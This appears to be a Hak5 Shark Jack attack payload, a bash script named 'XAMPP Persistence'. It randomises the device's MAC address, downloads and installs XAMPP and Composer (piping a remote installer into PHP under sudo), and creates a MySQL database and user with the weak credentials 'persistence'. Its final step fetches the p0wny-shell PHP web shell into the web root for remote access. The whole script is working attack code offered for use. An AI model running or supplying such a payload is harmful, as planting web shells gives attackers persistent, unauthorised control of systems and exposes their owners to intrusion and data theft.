#!/bin/bash
# Shark Jack Payload: XAMPP Persistence
# Author: lukeswitz

# Setup
LED SETUP
NETMODE TRANSPARENT
sleep 5

# Change the MAC address of the network interface
macchanger -r eth0

# Download and install XAMPP
wget https://www.apachefriends.org/xampp-files/7.4.11/xampp-linux-x64-7.4.11-0-installer.run
chmod +x xampp-linux-x64-7.4.11-0-installer.run
sudo ./xampp-linux-x64-7.4.11-0-installer.run

# Start XAMPP
/opt/lampp/lampp start

# Set up environment for XAMPP
echo 'export PATH=\"/opt/lampp/bin:$PATH\"' >> ~/.bash_profile
curl -sS https://getcomposer.org/installer | \
  sudo /opt/lampp/bin/php -- \
    --install-dir=/opt/lampp/bin --filename=composer

# Set up a database and user for persistence
mysql -u root <<-EOF
CREATE DATABASE persistence;
CREATE USER 'persistence'@'localhost' IDENTIFIED BY 'persistence';
GRANT ALL PRIVILEGES ON persistence.* TO 'persistence'@'localhost';
FLUSH PRIVILEGES;
EOF

# Download and set up a PHP web shell for remote access
wget https://github.com/flozz/p0wny-shell/raw/master/shell.php -O /opt/lampp/htdocs/shell.php

LED ATTACK
